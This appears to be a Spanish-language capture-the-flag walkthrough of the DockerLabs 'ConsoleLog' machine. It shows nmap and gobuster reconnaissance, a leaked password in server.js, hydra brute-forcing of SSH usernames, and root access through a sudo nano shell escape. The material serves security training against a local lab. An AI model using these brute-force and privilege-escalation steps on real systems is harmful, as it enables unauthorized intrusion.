ConsoleLog-DockerLabs🇪🇸

**1. Primero vamos a desempaquetar el archivo y moverlo hacia nuestro directorio.**
```bash
unzip consolelog.zip 
```

<img width="867" height="414" alt="image" src="https://github.com/user-attachments/assets/2fa351e3-124c-492e-9f60-0f8b4e93bb37" />


**2. Ahora vamos a encender el laboratorio.**
```bash
sudo bash ./auto_deploy.sh consolelog.tar 
```

<img width="870" height="494" alt="image" src="https://github.com/user-attachments/assets/3bd48f1f-b45e-40c5-8948-0b3cbc289d24" />


**3. Hay que comprobar la conexión con la máquina con un ping**
```bash
 ping -c3 172.17.0.2
```

<img width="866" height="191" alt="image" src="https://github.com/user-attachments/assets/e928f248-de1d-401a-ac22-70a137747b14" />


**4. Vamos a realizar un rastreo de puertos abiertos con nmap.**
```bash
 nmap -sCV -p- 172.17.0.2
```

<img width="871" height="383" alt="image" src="https://github.com/user-attachments/assets/2db00e5f-37e1-4830-a35f-d3246caeaa07" />


**5. Realizaremos un gobuster para buscar directorios ocultos en la web.**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -b 403,404 -t 30
```

<img width="861" height="472" alt="image" src="https://github.com/user-attachments/assets/f08af3c3-ff8b-43d0-bddb-b4507754987b" />


**6. Entraremos al apartado del backend y al server.js, l archivo muestra una app escuchando en el puerto 3000 y un endpoint POST /recurso el cual comprueba un token**

<img width="1058" height="490" alt="image" src="https://github.com/user-attachments/assets/f558b62c-3636-4366-873d-ec9fceaa22ff" />


**7. Realizaremos un ataque de fuerza bruta con hydra a través de la contraseña que aparece en el token.**
```bash
hydra -L /usr/share/wordlists/rockyou.txt \
  -p "lapassworddebackupmaschingonadetodas" \
  -s 5000 172.17.0.2 ssh
```

<img width="871" height="337" alt="image" src="https://github.com/user-attachments/assets/bb3f2f0e-9f32-4050-97c8-18194d0c02b1" />


**8. Entraremos al usuario mediante ssh por el puerto 5000 al tener el usuario y contraseña con el hydra.**
```bash
ssh lovely@172.17.0.2 -p 5000
```

<img width="863" height="387" alt="image" src="https://github.com/user-attachments/assets/8815f04b-f4df-46f4-bce5-784b3bcd1578" />


**9. Veremos ahora que binarios puede ejecutar le usuario lovely con `sudo -l`.**

<img width="887" height="160" alt="image" src="https://github.com/user-attachments/assets/a6a44e03-71dc-4916-b4a2-198f13f85d99" />


**10. Escalaremos de privilegios mirando en la web https://gtfobins.org/gtfobins/nano/#shell**
```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

<img width="877" height="914" alt="image" src="https://github.com/user-attachments/assets/d545bbca-1c71-4836-9027-3dc9884f0b63" />


**No hay ninguna flag de root.**

<img width="870" height="486" alt="image" src="https://github.com/user-attachments/assets/a7388731-7006-4062-a812-e08d90a31585" />
<img width="870" height="486" alt="image" src="https://github.com/user-attachments/assets/67607eae-bdfe-4331-84e4-786004013bca" />
